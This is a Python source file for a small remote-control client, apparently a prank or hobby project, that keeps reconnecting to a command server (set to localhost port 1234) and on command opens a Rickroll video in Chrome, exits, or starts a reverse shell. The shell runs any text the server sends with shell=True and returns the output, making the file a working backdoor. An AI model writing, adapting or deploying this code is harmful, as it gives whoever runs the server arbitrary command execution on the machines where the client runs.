import subprocess
import threading
import webbrowser
import socket

HOST = '127.0.0.1'
PORT = 1234

URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
chrome_path = 'C:\Program Files\Google\Chrome\Application\chrome.exe'

def main():
    # rickroll()
    socketStart()


def rickroll():
    subprocess.call([chrome_path, URL])


def socketStart():
    while True:  # search for server
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((HOST, PORT))
                # listen for requests
                while True:  # while connected to server
                    data = s.recv(1024).decode('utf-8')
                    if not data:
                        break
                    elif data == 'KILL':
                        print("Connection closed by server.")
                        exit(0)
                    elif data == 'ROLL':
                        rickroll()
                    elif data == 'RSHELL':
                        print("Opening Reverse Shell...")
                        rshell(s)
                        print("Reverse Shell closed.")
                    else:
                        print("Received data: {}".format(data))
        except socket.error as e:  # if server connection fails
            print("Connection error: {}".format(e))


def rshell(s):
    while True:
        command = s.recv(1024).decode('utf-8')
        print("RShell command: {}".format(command))
        if command.lower() == 'exit':
            break
        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        results, errors = output.communicate()
        # ternary operator
        s.send(results if results else errors)
        print("RShell results: {}".format(results.decode('utf-8')))


if __name__ == "__main__":
    main()